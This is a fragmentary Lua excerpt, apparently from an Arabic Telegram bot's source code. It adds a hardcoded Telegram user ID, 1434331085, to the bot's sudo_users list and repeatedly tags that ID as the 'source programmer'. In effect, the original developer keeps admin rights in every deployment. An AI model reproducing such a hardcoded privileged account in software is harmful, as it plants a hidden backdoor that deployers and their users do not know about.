...
DevId = sudos.SUDO 
sudo_users = {sudos.sudo_users,1434331085} 
bot_id = sudos.bot_id 
...
if tonumber(result.sender_user_id_) == tonumber(1434331085) then
t = 'مبرمج السورس'
...
return false  end
if res.id_ then  
if tonumber(res.id_) == tonumber(1434331085) then
t = 'مبرمج السورس'
...
if tonumber(iduser) == tonumber(1434331085) then
t = 'مبرمج السورس'
